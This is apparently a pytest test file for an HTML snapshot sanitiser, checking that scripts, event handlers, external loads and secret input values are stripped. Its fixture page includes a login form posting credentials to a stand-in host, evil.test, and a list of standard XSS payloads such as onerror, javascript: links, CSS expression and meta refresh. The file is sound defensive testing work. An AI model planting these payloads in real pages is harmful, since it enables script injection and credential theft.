import pytest

from app.flows.snapshot import clean_snapshot_html

PAGE = """
<html><head><title>Login</title><script>steal()</script>
<link rel="stylesheet" href="https://evil.test/x.css"><style>@import url(https://evil.test/a.css);</style></head>
<body onload="steal()">
<form id="login" action="https://evil.test/collect">
  <input name="username" value="owner" data-testid="user">
  <input type="password" name="password" value="s3cret-pass">
  <input name="otp" value="123456"><input name="token" value="tok-999">
  <input type="hidden" name="csrf" value="csrf-abc">
  <button id="go" type="submit" onclick="steal()">Sign in</button>
</form>
<a href="javascript:steal()">bad</a><a href="https://evil.test/">external</a>
<img src="https://evil.test/p.gif" alt="x"><img src="data:image/png;base64,AAAA" alt="ok">
<iframe src="https://evil.test"></iframe><object data="x"></object><embed src="x">
<p id="stock" class="stock-status" style="color:red">In stock</p>
<p style="background:url(https://evil.test/b.png)">styled</p>
</body></html>
"""


@pytest.fixture
def cleaned() -> str:
    return clean_snapshot_html(PAGE)


@pytest.mark.parametrize("gone", [
    "steal()", "<script", "<iframe", "<object", "<embed", "onclick", "onload", "javascript:",
    "evil.test", "<link", "@import",
])
def test_dangerous_content_is_removed(cleaned: str, gone: str) -> None:
    assert gone not in cleaned


@pytest.mark.parametrize("secret", ["s3cret-pass", "123456", "tok-999", "csrf-abc"])
def test_secret_input_values_are_blanked(cleaned: str, secret: str) -> None:
    assert secret not in cleaned


def test_selector_friendly_attributes_survive(cleaned: str) -> None:
    for kept in ('id="stock"', 'class="stock-status"', 'name="username"', 'data-testid="user"',
                 'id="go"', "In stock"):
        assert kept in cleaned


def test_inline_data_images_are_kept_and_external_ones_dropped(cleaned: str) -> None:
    assert "data:image/png;base64,AAAA" in cleaned


def test_safe_inline_style_is_kept_but_url_styles_are_dropped(cleaned: str) -> None:
    assert "color:red" in cleaned.replace(" ", "")
    assert "background" not in cleaned


def test_output_is_a_full_document_with_a_charset() -> None:
    assert clean_snapshot_html("<p>hi</p>").lower().startswith("<!doctype html>")
    assert 'charset="utf-8"' in clean_snapshot_html("<p>hi</p>").lower()


@pytest.mark.parametrize("payload", [
    "<img src=x onerror=alert(1)>", "<svg><script>alert(1)</script></svg>",
    "<a href=\"JaVaScRiPt:alert(1)\">x</a>",
    "<math><mi xlink:href=\"javascript:alert(1)\">x</mi></math>",
    "<div style=\"width:expression(alert(1))\">x</div>",
    "<form action=javascript:alert(1)><button>x</button></form>",
    "<meta http-equiv=refresh content=\"0;url=https://evil.test\">",
    "<base href=\"https://evil.test/\">",
])
def test_xss_payloads_are_neutralised(payload: str) -> None:
    out = clean_snapshot_html(payload).lower()
    for bad in ("alert(", "onerror", "javascript:", "evil.test", "expression(", "<script"):
        assert bad not in out


def test_empty_input_gives_an_empty_document() -> None:
    assert "<body>" in clean_snapshot_html("")


def test_page_title_does_not_leak_into_the_body() -> None:
    page = "<html><head><title>Secret title</title></head><body><p>x</p></body></html>"
    out = clean_snapshot_html(page)
    assert "Secret title" not in out
